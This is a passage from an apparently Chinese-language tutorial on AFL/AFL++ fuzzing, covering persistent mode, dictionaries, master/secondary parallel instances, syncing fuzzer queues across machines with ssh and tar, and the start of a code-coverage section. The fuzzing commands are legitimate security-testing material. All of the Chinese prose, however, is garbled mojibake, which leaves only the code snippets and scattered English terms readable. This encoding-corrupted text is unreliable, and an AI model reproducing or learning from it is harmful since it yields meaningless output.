src="/Linux/assets/Pasted%20image%2020250403122803.png"></p><p>å°†å®ƒæŠ±èµ·æ¥ï¼Œåœ¨å¤–é¢åŠ ä¸€ä¸ªwhileå¾ªç¯ã€‚è®©å…¶è¿è¡Œå¤šæ¬¡ï¼Œè¿™æ ·å°±å¯ä»¥æ¥æ”¶å¤šæ¬¡æ ·æœ¬æŠ•å–‚ã€‚è·¯å¾„è¦†ç›–åˆ¶å¯¼ï¼ŒæŠ•å–‚ä¸€ç™¾æ¬¡æ ·æœ¬å¦‚ä½•è®©ç¨‹åºå°†è¦†ç›–åˆ¶å¯¼ä¿¡æ¯è¿”å›ç»™aflã€‚å¦‚ä½•è®©åé¢çš„æŠ•å–‚ä¸å—å‰é¢çš„å½±å“ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250403123046.png"></p><p><code>__AFL_LOOP</code>çš„ä½¿ç”¨åœºæ™¯ï¼Œå¯¹ç½‘ç»œç¨‹åºè¿›è¡Œfuzzã€‚åœ¨fuzzç½‘ç»œç¨‹åºä¸­æˆ‘ä»¬å¹¶ä¸å…³æ³¨socketåˆ›å»ºåˆå§‹åŒ–çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>AFL_INIT</code>ç•¥è¿‡è¿™éƒ¨åˆ†ä»£ç ï¼Œç„¶åå¯¹<code>recv</code>è¿›è¡Œfuzzã€‚</p><p>ä»…æ’æ¡©ä½ éœ€è¦çš„éƒ¨åˆ†</p><p>ä»…å¯¹ä½ ç°åœ¨è¦å‹åŠ›æµ‹è¯•çš„åº“è¿›è¡Œæ’æ¡©ï¼Œä¸€æ¬¡ä¸€ä¸ªã€‚è®©ç¨‹åºåœ¨ä»»ä½•ä¸éœ€è¦æ¨¡ç³Šæµ‹è¯•çš„åŠŸèƒ½ä¸Šä½¿ç”¨ç³»ç»ŸèŒƒå›´çš„ã€æœªæ’æ¡©çš„åº“ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸å¿…å› ä¸ºä½ æ­£åœ¨æµ‹è¯•ä¸€ä¸ªä¾èµ–äºlibgmpçš„å¤§æ•°æ•°å­¦çš„åŠ å¯†åº”ç”¨ç¨‹åºè€Œå¯¹libgmpè¿›è¡Œæ’æ¡©ã€‚</p><p>å½“ç¨‹åºåŒ…å«ä¸€äº›å¥‡æ€ªçš„ç¬¬ä¸‰æ–¹åº“æ—¶ï¼ˆä¾‹å¦‚ï¼ŒSpidermonkeyï¼‰ï¼Œè¯·æ£€æŸ¥<code>./configure</code>é€‰é¡¹ï¼Œä½¿ç”¨ç³»ç»ŸèŒƒå›´çš„éæ’æ¡©ç‰ˆæœ¬ã€‚</p><h3 id="å¹¶è¡Œ"><a href="#å¹¶è¡Œ" class="headerlink" title="å¹¶è¡Œ"></a>å¹¶è¡Œ</h3><p>åœ¨ AFL ä¸­å¦‚æœæˆ‘ä»¬å¯¹è·¯å¾„æŒ‡å‘æœ‰ç‰¹å®šè¦æ±‚çš„ç¨‹åºè¿›è¡Œ Fuzzï¼Œæ¯”å¦‚ä»¥ä¸‹è¿™ç§æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;abc&quot;</span>))<br>&#123;...&#125;<br><span class="hljs-keyword">else</span>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å…¥å†…å®¹å¿…é¡»ä¸º<code>abc</code>æ‰èƒ½è¿›å…¥<code>if</code>è·¯å¾„ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ AFL ç›´æ¥è¿›è¡Œ Fuzz åªèƒ½é€šè¿‡ä¸æ–­å¯¹è¾“å…¥æ ·æœ¬è¿›è¡Œå˜å¼‚æ¥è®©è¾“å…¥è¾¾åˆ°è¿™ç§è¦æ±‚ã€‚ä½†æ˜¯è¿™æ · Fuzz çš„æ•ˆç‡æä½ï¼Œæˆ‘ä»¬ä¾‹å­ä¸­çš„è¦æ±‚å¾ˆå°‘ï¼Œå¦‚æœè¦æ±‚å¾ˆå¤§æ¯”å¦‚å‡ åä¸ªå­—ç¬¦ï¼Œé‚£æ ·çš„è¯å°±æ›´éš¾è¾¾åˆ°å˜å¼‚è¦æ±‚äº†ã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å­—å…¸æ¥åŠ å¤§ Fuzz æ•ˆç‡ï¼Œå¦‚æœçš„å­—å…¸ä¸­æœ‰<code>abc</code>ï¼Œåˆ™<code>abc</code>ä¼šè¢«æ’å…¥åˆ°æ ·æœ¬ä¸­ã€‚è¿™æ ·å°±ç›´æ¥æ»¡è¶³äº†è¦æ±‚ã€‚AFL++ é¡¹ç›®ä¸­å°±å†…ç½®äº†å¾ˆå¤šå­—å…¸</p><p>å¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šå­—å…¸ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡åº“å‡½æ•°æ’æ¡©æ¥è¿›å…¥è·¯å¾„ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;c&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦æ›´é«˜çš„æ•ˆç‡ï¼Œå¯ä»¥å»é€†å‘ç ”ç©¶ä¸€ä¸‹è¦ Fuzz çš„ç¨‹åºï¼Œå°†ä¸€äº›å¯èƒ½çš„å›ºå®šæ­é…æ”¶é›†æˆå­—å…¸ã€‚</p><h4 id="å¹¶è¡ŒåŒ–"><a href="#å¹¶è¡ŒåŒ–" class="headerlink" title="å¹¶è¡ŒåŒ–"></a>å¹¶è¡ŒåŒ–</h4><p>ç°åœ¨æˆ‘ä»¬çš„è®¡ç®—æœºä¸€èˆ¬éƒ½æ˜¯å¤šæ ¸çš„ CPUï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å¹¶è¡ŒåŒ–æ¨¡ç³Šæµ‹è¯•å……åˆ†åˆ©ç”¨ CPU çš„èµ„æºã€‚</p><ul><li>ç‹¬ç«‹å®ä¾‹</li></ul><p>è¿™æ˜¯æœ€ç®€å•çš„å¹¶è¡ŒåŒ–ç­–ç•¥ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬è¿è¡Œå¤šä¸ªå®Œå…¨ç‹¬ç«‹çš„ AFL å®ä¾‹ã€‚</p><p>éœ€è¦è®°ä½çš„æ˜¯ï¼ŒAFL ä½¿ç”¨éç¡®å®šæ€§çš„æµ‹è¯•ç®—æ³•ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è¿è¡Œå¤šä¸ª AFL å®ä¾‹ï¼Œå°†å¢åŠ æˆåŠŸçš„æœºä¼šã€‚</p><p>ä½ åªéœ€è¦åœ¨å¤šä¸ªç»ˆç«¯çª—å£ä¸­è¿è¡Œå¤šä¸ª â€œafl-fuzzâ€ å®ä¾‹ï¼Œå¹¶ä¸ºæ¯ä¸ªå®ä¾‹è®¾ç½®ä¸åŒçš„ â€œè¾“å‡ºæ–‡ä»¶å¤¹â€ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯æ ¹æ®ä½ ç³»ç»Ÿçš„æ ¸å¿ƒæ•°è¿è¡Œå¤šä¸ªæ¨¡ç³Šæµ‹è¯•ä»»åŠ¡ã€‚</p><p>æ³¨æ„ï¼šå¦‚æœä½ ä½¿ç”¨äº† <code>-s</code> å‚æ•°ï¼Œéœ€è¦ä¸ºæ¯ä¸ªå®ä¾‹ä½¿ç”¨ä¸åŒçš„ç§å­ã€‚</p><ul><li>å…±äº«å®ä¾‹</li></ul><p>ä½¿ç”¨å…±äº«å®ä¾‹æ˜¯æ›´å¥½çš„å¹¶è¡ŒåŒ–æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å®ä¾‹ä¼šæ”¶é›†å…¶ä»–æ¨¡ç³Šæµ‹è¯•å®ä¾‹å‘ç°çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä½ åªæœ‰ä¸€ä¸ªä¸»å®ä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./afl-fuzz -i afl_in -o afl_out -M Master -- ./program @@<br></code></pre></td></tr></table></figure><p>å’Œ N-1 ä¸ªä»å®ä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">./afl-fuzz -i afl_in -o afl_out -S slave1 -- ./program @@<br>./afl-fuzz -i afl_in -o afl_out -S slave2 -- ./program @@<br>...<br>./afl-fuzz -i afl_in -o afl_out -S slaveN -- ./program @@<br></code></pre></td></tr></table></figure><h4 id="å•ç³»ç»Ÿå¹¶è¡ŒåŒ–"><a href="#å•ç³»ç»Ÿå¹¶è¡ŒåŒ–" class="headerlink" title="å•ç³»ç»Ÿå¹¶è¡ŒåŒ–"></a>å•ç³»ç»Ÿå¹¶è¡ŒåŒ–</h4><p>å¦‚æœæ‚¨å¸Œæœ›åœ¨æœ¬åœ°ç³»ç»Ÿçš„å¤šä¸ªæ ¸å¿ƒä¸Šå¹¶è¡ŒåŒ–å•ä¸ªä½œä¸šï¼Œåªéœ€åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºè¾“å‡ºç›®å½•ï¼ˆâ€œåŒæ­¥ç›®å½•â€ï¼‰ï¼Œå¹¶è®©æ‰€æœ‰ afl-fuzz å®ä¾‹å…±äº«è¯¥ç›®å½•ï¼›ç„¶åä¸ºæ¯ä¸ªå®ä¾‹å‘½åï¼Œä¾‹å¦‚â€œfuzzer01â€ã€â€œfuzzer02â€ç­‰ã€‚</p><p>å¯åŠ¨ç¬¬ä¸€ä¸ªï¼ˆâ€œä¸»â€å®ä¾‹ï¼Œ-Mï¼‰å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 [...å…¶ä»–å‚æ•°...]<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œå¯åŠ¨å…¶ä»–ï¼ˆ-Sï¼‰å®ä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 [...å…¶ä»–å‚æ•°...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 [...å…¶ä»–å‚æ•°...]<br></code></pre></td></tr></table></figure><p>æ¯ä¸ª fuzzer ä¼šå°†è‡ªå·±çš„çŠ¶æ€ä¿å­˜åœ¨ä¸åŒçš„å­ç›®å½•ä¸­ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/sync_dir/</span>fuzzer01/<br></code></pre></td></tr></table></figure><p>æ¯ä¸ªå®ä¾‹ä¹Ÿä¼šå®šæœŸé‡æ–°æ‰«æé¡¶å±‚åŒæ­¥ç›®å½•ï¼ŒæŸ¥çœ‹å…¶ä»–æ¨¡ç³Šæµ‹è¯•å™¨æ˜¯å¦å‘ç°äº†æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¦‚æœæœ‰ï¼Œå®ƒä»¬ä¼šå°†è¿™äº›ç”¨ä¾‹çº³å…¥è‡ªå·±çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ã€‚</p><p>-M å’Œ -S æ¨¡å¼çš„åŒºåˆ«åœ¨äºï¼Œä¸»å®ä¾‹ä»ç„¶ä¼šæ‰§è¡Œç¡®å®šæ€§æ£€æŸ¥ï¼›è€Œå…¶ä»–å®ä¾‹ä¼šç›´æ¥è¿›è¡Œéšæœºè°ƒæ•´ã€‚å¦‚æœæ‚¨ä¸å¸Œæœ›è¿›è¡Œç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•ï¼Œå®Œå…¨å¯ä»¥è®©æ‰€æœ‰å®ä¾‹éƒ½ä½¿ç”¨ -S æ¨¡å¼ã€‚å¯¹äºéå¸¸æ…¢æˆ–å¤æ‚çš„ç›®æ ‡ï¼Œæˆ–è€…åœ¨é«˜åº¦å¹¶è¡ŒåŒ–çš„ä½œä¸šä¸­ï¼Œè¿™é€šå¸¸æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p><p>æ³¨æ„ï¼šè¿è¡Œå¤šä¸ª -M å®ä¾‹æ˜¯æµªè´¹èµ„æºçš„ï¼Œè™½ç„¶ç›®å‰æœ‰å®éªŒæ€§æ”¯æŒæ¥å¹¶è¡ŒåŒ–ç¡®å®šæ€§æ£€æŸ¥ã€‚è‹¥è¦åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œæ‚¨éœ€è¦æŒ‰å¦‚ä¸‹æ–¹å¼åˆ›å»º -M å®ä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterA:1/3 [...å…¶ä»–å‚æ•°...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterB:2/3 [...å…¶ä»–å‚æ•°...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterC:3/3 [...å…¶ä»–å‚æ•°...]<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œå†’å·åçš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ç‰¹å®šä¸»å®ä¾‹çš„é¡ºåº IDï¼ˆä» 1 å¼€å§‹ï¼‰ï¼Œç¬¬äºŒä¸ªå€¼æ˜¯æ€»å…±è¦åˆ†é…ç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•çš„ fuzzers æ•°é‡ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯åŠ¨çš„ fuzzers å°‘äºç¬¬äºŒä¸ªæ•°å­—æŒ‡å®šçš„æ•°é‡ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¦†ç›–ä¸è¶³ã€‚</p><p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ afl-whatsup å·¥å…·ä»å‘½ä»¤è¡Œç›‘æ§ä½œä¸šè¿›åº¦ã€‚å½“å®ä¾‹ä¸å†å‘ç°æ–°çš„è·¯å¾„æ—¶ï¼Œå¯èƒ½æ˜¯åœæ­¢çš„æ—¶å€™äº†ã€‚</p><p>è­¦å‘Šï¼šåœ¨æ˜¾å¼æŒ‡å®š -f é€‰é¡¹æ—¶è¦å°å¿ƒã€‚æ¯ä¸ª fuzzer å¿…é¡»ä½¿ç”¨å•ç‹¬çš„ä¸´æ—¶æ–‡ä»¶ï¼›å¦åˆ™å¯èƒ½ä¼šå‘ç”Ÿå†²çªã€‚ä¸€ä¸ªå®‰å…¨çš„ä¾‹å­æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz [...] -S fuzzer10 -f file10.txt ./fuzzed/binary @@<br>$ ./afl-fuzz [...] -S fuzzer11 -f file11.txt ./fuzzed/binary @@<br>$ ./afl-fuzz [...] -S fuzzer12 -f file12.txt ./fuzzed/binary @@<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸ä½¿ç”¨ -f é€‰é¡¹å¹¶ä¸”è®© afl-fuzz è‡ªåŠ¨ç”Ÿæˆæ–‡ä»¶åï¼Œé€šå¸¸ä¸ä¼šæœ‰é—®é¢˜ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250520134848.png"></p><h4 id="å¤šç³»ç»Ÿå¹¶è¡ŒåŒ–"><a href="#å¤šç³»ç»Ÿå¹¶è¡ŒåŒ–" class="headerlink" title="å¤šç³»ç»Ÿå¹¶è¡ŒåŒ–"></a>å¤šç³»ç»Ÿå¹¶è¡ŒåŒ–</h4><p>å¤šç³»ç»Ÿå¹¶è¡ŒåŒ–çš„åŸºæœ¬æ“ä½œåŸç†ä¸ç¬¬ 2 èŠ‚ä¸­è§£é‡Šçš„æœºåˆ¶ç›¸ä¼¼ã€‚å…³é”®åŒºåˆ«åœ¨äºï¼Œæ‚¨éœ€è¦ç¼–å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œæ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªæ“ä½œï¼š</p><ul><li><p>ä½¿ç”¨ SSH å’Œ authorized_keys è¿æ¥åˆ°æ¯å°æœºå™¨ï¼Œå¹¶è·å–æ¯ä¸ª <fuzzer_id> æœ¬åœ°æœºå™¨ä¸Šçš„ &#x2F;path&#x2F;to&#x2F;sync_dir&#x2F;<fuzzer_id>&#x2F;queue&#x2F; ç›®å½•çš„ tar å½’æ¡£ã€‚æœ€å¥½ä¸ºæ¯ä¸ª fuzzer ID ä½¿ç”¨ä¸€ä¸ªåŒ…å«ä¸»æœºåçš„å‘½åæ–¹æ¡ˆï¼Œä¾‹å¦‚ï¼š</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>  ssh user@host<span class="hljs-variable">$&#123;s&#125;</span> <span class="hljs-string">&quot;tar -czf - sync/host<span class="hljs-variable">$&#123;s&#125;</span>_fuzzid*/[qf]*&quot;</span> &gt;host<span class="hljs-variable">$&#123;s&#125;</span>.tgz<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></li><li><p>åœ¨æ‰€æœ‰å‰©ä½™æœºå™¨ä¸Šåˆ†å‘å¹¶è§£å‹è¿™äº›æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$s</span>&quot;</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$d</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">continue</span><br>    ssh user@host<span class="hljs-variable">$&#123;d&#125;</span> <span class="hljs-string">&#x27;tar -kxzf -&#x27;</span> &lt;host<span class="hljs-variable">$&#123;s&#125;</span>.tgz<br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></li></ul><p>åœ¨ experimental&#x2F;distributed_fuzzing&#x2F; ä¸­æœ‰ä¸€ä¸ªè¿™æ ·çš„è„šæœ¬ç¤ºä¾‹ï¼›æ‚¨è¿˜å¯ä»¥æ‰¾åˆ° Martijn Bogaard å¼€å‘çš„ä¸€ä¸ªæ›´å®Œæ•´çš„å®éªŒå·¥å…·ï¼š</p><p><a href="https://github.com/MartijnB/disfuzz-afl">https://github.com/MartijnB/disfuzz-afl</a></p><p>Richo Healey æä¾›çš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯-æœåŠ¡å™¨å®ç°æ˜¯ï¼š</p><p><a href="https://github.com/richo/roving">https://github.com/richo/roving</a></p><p>è¯·æ³¨æ„ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹å·¥å…·ä¸é€‚å®œåœ¨æš´éœ²äºäº’è”ç½‘æˆ–ä¸å—ä¿¡ä»»çš„ç”¨æˆ·çš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚</p><p>åœ¨å¼€å‘è‡ªå®šä¹‰çš„æµ‹è¯•ç”¨ä¾‹åŒæ­¥ä»£ç æ—¶ï¼Œæœ‰å‡ ä¸ªä¼˜åŒ–ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li><p>åŒæ­¥ä¸å¿…å¤ªé¢‘ç¹ï¼›æ¯ 30 åˆ†é’ŸåŒæ­¥ä¸€æ¬¡é€šå¸¸å°±å¯ä»¥äº†ã€‚</p></li><li><p>ä¸éœ€è¦åŒæ­¥ crashes&#x2F; æˆ– hangs&#x2F; ç›®å½•ï¼›åªéœ€è¦å¤åˆ¶ queue&#x2F;*ï¼ˆæœ€å¥½è¿˜åŒ…æ‹¬ fuzzer_statsï¼‰ã€‚</p></li><li><p>ä¸éœ€è¦ï¼ˆè€Œä¸”ä¸å»ºè®®ï¼‰è¦†ç›–ç°æœ‰çš„æ–‡ä»¶ï¼›tar ä¸­çš„ -k é€‰é¡¹æ˜¯é¿å…è¿™ä¸€ç‚¹çš„å¥½æ–¹æ³•ã€‚</p></li><li><p>ä¸éœ€è¦è·å–é‚£äº›åœ¨æŸå°æœºå™¨ä¸Šæ²¡æœ‰è¿è¡Œçš„æ¨¡ç³Šæµ‹è¯•å™¨çš„ç›®å½•ï¼Œå®ƒä»¬å¯èƒ½åªæ˜¯ä¹‹å‰å¤åˆ¶åˆ°è¯¥ç³»ç»Ÿä¸Šçš„ã€‚</p></li><li><p>å¯¹äºå¤§è§„æ¨¡çš„ç³»ç»Ÿç¾¤ï¼Œæ‚¨å°†å¸Œæœ›åˆå¹¶æ¯å°ä¸»æœºçš„ tar åŒ…ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ n ä¸ª SSH è¿æ¥æ¥åŒæ­¥ï¼Œè€Œä¸æ˜¯ n*(n-1)ã€‚</p></li><li><p>æ‚¨è¿˜å¯ä»¥å®ç°åˆ†é˜¶æ®µåŒæ­¥ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥å°†ç³»ç»Ÿåˆ†ä¸º 10 ç»„ï¼Œç¬¬ 1 ç»„åªå‘ç¬¬ 2 ç»„æ¨é€æµ‹è¯•ç”¨ä¾‹ï¼Œç¬¬ 2 ç»„åªå‘ç¬¬ 3 ç»„æ¨é€ï¼Œä»¥æ­¤ç±»æ¨ï¼Œæœ€ç»ˆç¬¬ 10 ç»„ä¼šå°†æµ‹è¯•ç”¨ä¾‹å›ä¼ ç»™ç¬¬ 1 ç»„ã€‚</p></li></ul><p>è¿™ç§å®‰æ’å°†ä½¿å¾—æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹èƒ½å¤Ÿåœ¨ç³»ç»Ÿç¾¤ä¹‹é—´ä¼ æ’­ï¼Œè€Œæ— éœ€å°†æ¯ä¸ª fuzzer çš„é˜Ÿåˆ—å¤åˆ¶åˆ°æ¯ä¸€å°ä¸»æœºä¸Šã€‚</p><ul><li>ä¸è¦åœ¨æ¯å°æœºå™¨ä¸Šè¿è¡Œä¸€ä¸ª â€œä¸»â€ å®ä¾‹ï¼›æ‚¨åº”å½“è®©å®ƒä»¬éƒ½ä½¿ç”¨ -Sï¼Œå¹¶ä»…åœ¨æŸä¸ªåœ°æ–¹æŒ‡å®šä¸€ä¸ªå®ä¾‹è¿è¡Œ -Mã€‚</li></ul><p>ä¸å»ºè®®è·³è¿‡åŒæ­¥è„šæœ¬ç›´æ¥åœ¨ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿä¸Šè¿è¡Œæ¨¡ç³Šæµ‹è¯•å™¨ï¼Œå› ä¸ºæ„å¤–çš„å»¶è¿Ÿå’Œæ— æ³•ç»ˆæ­¢çš„è¿›ç¨‹å¯èƒ½ä¼šå¯¼è‡´ I&#x2F;O ç­‰å¾…çŠ¶æ€ï¼Œè¿›è€Œå½±å“ç»“æœã€‚</p><h4 id="è¿œç¨‹ç›‘æ§å’Œæ•°æ®æ”¶é›†"><a href="#è¿œç¨‹ç›‘æ§å’Œæ•°æ®æ”¶é›†" class="headerlink" title="è¿œç¨‹ç›‘æ§å’Œæ•°æ®æ”¶é›†"></a>è¿œç¨‹ç›‘æ§å’Œæ•°æ®æ”¶é›†</h4><p>æ‚¨å¯ä»¥ä½¿ç”¨ screenã€nohupã€tmux æˆ–ç±»ä¼¼å·¥å…·æ¥è¿è¡Œè¿œç¨‹çš„ afl-fuzz å®ä¾‹ã€‚å¦‚æœæ‚¨å°†ç¨‹åºçš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼Œå®ƒå°†è‡ªåŠ¨ä»å¤æ‚çš„ UI åˆ‡æ¢ä¸ºæ›´ç®€å•çš„çŠ¶æ€æŠ¥å‘Šã€‚æ¯ä¸ªå®ä¾‹çš„è¾“å‡ºç›®å½•éƒ½ä¼šæœ‰ä¸€ä¸ªæœºå™¨å¯è¯»çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ afl-whatsup å·¥å…·æŸ¥çœ‹ã€‚</p><p>åŸåˆ™ä¸Šï¼Œæ‚¨å¯ä»¥é€šè¿‡ç›‘æ§ä¸»å®ä¾‹ï¼ˆ-Mï¼‰çš„çŠ¶æ€å±å¹•æ¥æŸ¥çœ‹æ•´ä½“çš„æ¨¡ç³Šæµ‹è¯•è¿›åº¦ï¼Œå†³å®šä½•æ—¶åœæ­¢ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæœ€é‡è¦çš„ä¿¡å·å°±æ˜¯å½“é•¿æ—¶é—´æ²¡æœ‰å‘ç°æ–°è·¯å¾„æ—¶ã€‚å¦‚æœæ‚¨æ²¡æœ‰ä¸»å®ä¾‹ï¼Œåªéœ€é€‰æ‹©ä»»æ„ä¸€ä¸ªæ¬¡è¦å®ä¾‹è¿›è¡Œç›‘æ§ã€‚</p><p>æ‚¨ä¹Ÿå¯ä»¥ä¾èµ–è¯¥å®ä¾‹çš„è¾“å‡ºç›®å½•æ¥æ”¶é›†è¦†ç›–äº†æ•´ä¸ªç³»ç»Ÿç¾¤ä¸­æ‰€æœ‰æœ‰æ„ä¹‰è·¯å¾„çš„åˆæˆè¯­æ–™åº“ã€‚æ¬¡è¦å®ä¾‹ï¼ˆ-Sï¼‰ä¸éœ€è¦ä»»ä½•ç‰¹æ®Šç›‘æ§ï¼Œåªè¦ç¡®ä¿å®ƒä»¬å¤„äºè¿è¡ŒçŠ¶æ€å³å¯ã€‚</p><p>è¯·æ³¨æ„ï¼Œå´©æºƒçš„è¾“å…¥ä¸ä¼šè‡ªåŠ¨ä¼ æ’­åˆ°ä¸»å®ä¾‹ï¼Œå› æ­¤æ‚¨å¯èƒ½ä»ç„¶éœ€è¦é€šè¿‡åŒæ­¥æˆ–å¥åº·æ£€æŸ¥è„šæœ¬æ¥ç›‘æ§æ•´ä¸ªç³»ç»Ÿç¾¤çš„å´©æºƒæƒ…å†µï¼ˆå‚è§ afl-whatsupï¼‰ã€‚</p><h2 id="ä»£ç è¦†ç›–ç‡æµ‹é‡"><a href="#ä»£ç è¦†ç›–ç‡æµ‹é‡" class="headerlink" title="ä»£ç è¦†ç›–ç‡æµ‹é‡"></a>ä»£ç è¦†ç›–ç‡æµ‹é‡</h2><p>ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§è½¯ä»¶æŒ‡æ ‡ï¼Œè¡¨è¾¾äº†æ¯è¡Œä»£ç è¢«è§¦å‘çš„æ¬¡æ•°ã€‚åœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬çš„ fuzzer æ‰§è¡Œçš„æ•ˆæœæ€ä¹ˆæ ·ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨ä¸Šä»£ç è¦†ç›–ç‡ã€‚é€šè¿‡ä½¿ç”¨ä»£ç è¦†ç›–ç‡ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£ fuzzer å·²ç»åˆ°è¾¾äº†ä»£ç çš„å“ªäº›éƒ¨åˆ†ï¼Œå¹¶å¯è§†åŒ– fuzzing è¿‡ç¨‹ã€‚</p><p>IDA çš„ Lighouse æ’ä»¶å¯ä»¥é€šè¿‡è¯»å– Pin äº§ç”Ÿçš„è¦†ç›–ç‡æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨ IDA 